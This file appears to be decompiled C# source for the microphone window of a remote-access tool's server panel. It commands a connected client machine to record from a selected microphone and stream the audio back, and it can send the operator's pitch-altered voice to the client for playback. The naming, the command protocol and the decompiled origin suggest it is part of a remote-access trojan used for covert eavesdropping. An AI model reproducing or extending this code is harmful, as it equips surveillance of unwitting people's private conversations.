using System;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using NAudio.Wave;
using NAudio.Wave.SampleProviders;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000AE RID: 174
	public partial class FormMicrophone : FormMaterial
	{
		// Token: 0x0600055D RID: 1373 RVA: 0x0004D73E File Offset: 0x0004B93E
		public FormMicrophone()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x0600055E RID: 1374 RVA: 0x0004D769 File Offset: 0x0004B969
		private void FormMicrophone_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
		}

		// Token: 0x0600055F RID: 1375 RVA: 0x0004D793 File Offset: 0x0004B993
		private void ChangeScheme(object sender)
		{
			this.rjComboBox1.BorderColor = FormMaterial.PrimaryColor;
			this.rjComboBox2.BorderColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x06000560 RID: 1376 RVA: 0x0004D7B8 File Offset: 0x0004B9B8
		private void Closing1(object sender, EventArgs e)
		{
			if (this.client1 != null)
			{
				this.client1.Disconnect();
			}
			if (this.client2 != null)
			{
				this.client2.Disconnect();
			}
			if (this.g722 != null)
			{
				this.g722.Dispose();
			}
			if (this.waveIn != null)
			{
				this.waveIn.StopRecording();
				this.waveIn.Dispose();
			}
			if (this.waveOut != null)
			{
				this.waveOut.Stop();
				this.waveOut.Dispose();
			}
			if (this.bufferedWaveProvider != null)
			{
				this.bufferedWaveProvider = null;
			}
		}

		// Token: 0x06000561 RID: 1377 RVA: 0x0004D84C File Offset: 0x0004BA4C
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (!this.parrent.itsConnect)
			{
				base.Close();
			}
			if (this.client1 != null && !this.client1.itsConnect)
			{
				base.Close();
			}
			if (this.client2 != null && !this.client2.itsConnect)
			{
				base.Close();
			}
		}

		// Token: 0x06000562 RID: 1378 RVA: 0x0004D8A4 File Offset: 0x0004BAA4
		private void trackBar2_Scroll(object sender, EventArgs e)
		{
			float num;
			if (this.trackBar2.Value > 11)
			{
				num = (float)(this.trackBar2.Value - 1) / 10f;
			}
			else if (this.trackBar2.Value < 11)
			{
				num = (float)(this.trackBar2.Value - 1) / 10f * 0.5f + 0.5f;
			}
			else
			{
				num = 1f;
			}
			if (this.Pitch != num)
			{
				this.Pitch = num;
				this.client2.Send(LEB128.Write(new object[]
				{
					"Tone",
					num
				}));
			}
		}

		// Token: 0x06000563 RID: 1379 RVA: 0x0004D948 File Offset: 0x0004BB48
		private void trackBar1_Scroll(object sender, EventArgs e)
		{
			if (!this.materialSwitch1.Checked)
			{
				return;
			}
			this.volumeSampleProvider.Volume = (float)this.trackBar1.Value / 10f;
		}

		// Token: 0x06000564 RID: 1380 RVA: 0x0004D978 File Offset: 0x0004BB78
		private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.materialSwitch1.Checked)
			{
				if (this.waveOut != null)
				{
					this.waveOut.Stop();
					this.waveOut.Dispose();
				}
				if (this.g722 != null)
				{
					this.g722.Dispose();
				}
				if (this.bufferedWaveProvider != null)
				{
					this.bufferedWaveProvider = null;
				}
				this.client1.Send(LEB128.Write(new object[]
				{
					"RecoveryStopNAudio",
					this.Pitch
				}));
				return;
			}
			if (this.rjComboBox1.SelectedIndex == -1)
			{
				this.materialSwitch1.Checked = false;
				return;
			}
			this.g722 = new G722ChatCodec();
			this.bufferedWaveProvider = new BufferedWaveProvider(this.g722.RecordFormat);
			this.bufferedWaveProvider.DiscardOnBufferOverflow = true;
			this.client1.Send(LEB128.Write(new object[]
			{
				"RecoveryNAudio",
				(byte)this.rjComboBox1.SelectedIndex
			}));
			this.volumeSampleProvider = new VolumeSampleProvider(this.bufferedWaveProvider.ToSampleProvider());
			this.volumeSampleProvider.Volume = (float)this.trackBar1.Value / 100f;
			this.waveOut = new WaveOut();
			this.waveOut.Volume = 1f;
			this.waveOut.Init(this.volumeSampleProvider, false);
			this.waveOut.Play();
		}

		// Token: 0x06000565 RID: 1381 RVA: 0x0004DAE8 File Offset: 0x0004BCE8
		private void materialSwitch2_CheckedChanged(object sender, EventArgs e)
		{
			if (this.materialSwitch2.Checked)
			{
				this.client2.Send(LEB128.Write(new object[]
				{
					"PlayerStart",
					this.Pitch
				}));
				this.g722 = new G722ChatCodec();
				this.waveIn = new WaveIn();
				this.waveIn.DeviceNumber = this.rjComboBox2.SelectedIndex;
				this.waveIn.DataAvailable += this.waveIn_DataAvailable;
				this.waveIn.WaveFormat = this.g722.RecordFormat;
				this.waveIn.StartRecording();
				return;
			}
			this.client2.Send(LEB128.Write(new object[]
			{
				"PlayerStop"
			}));
			if (this.waveIn != null)
			{
				this.waveIn.StopRecording();
				this.waveIn.Dispose();
			}
			if (this.g722 != null)
			{
				this.g722.Dispose();
			}
		}

		// Token: 0x06000566 RID: 1382 RVA: 0x0004DBE5 File Offset: 0x0004BDE5
		public void waveIn_DataAvailable(object sender, WaveInEventArgs e)
		{
			this.client2.Send(LEB128.Write(new object[]
			{
				"PlayerBuffer",
				this.g722.Encode(e.Buffer, 0, e.Buffer.Length)
			}));
		}

		// Token: 0x06000567 RID: 1383 RVA: 0x0004DC24 File Offset: 0x0004BE24
		public void Buffer(byte[] e)
		{
			if (this.waveOut != null && this.bufferedWaveProvider != null && this.g722 != null)
			{
				byte[] array = this.g722.Decode(e, 0, e.Length);
				this.bufferedWaveProvider.AddSamples(array, 0, array.Count<byte>());
			}
		}

		// Token: 0x04000408 RID: 1032
		public Clients parrent;

		// Token: 0x04000409 RID: 1033
		public Clients client1;

		// Token: 0x0400040A RID: 1034
		public Clients client2;

		// Token: 0x0400040B RID: 1035
		public static int sampleRate = 48000;

		// Token: 0x0400040C RID: 1036
		public float Pitch = 1f;

		// Token: 0x0400040D RID: 1037
		public BufferedWaveProvider bufferedWaveProvider;

		// Token: 0x0400040E RID: 1038
		public VolumeSampleProvider volumeSampleProvider;

		// Token: 0x0400040F RID: 1039
		public G722ChatCodec g722;

		// Token: 0x04000410 RID: 1040
		public WaveOut waveOut;

		// Token: 0x04000411 RID: 1041
		private WaveIn waveIn;
	}
}
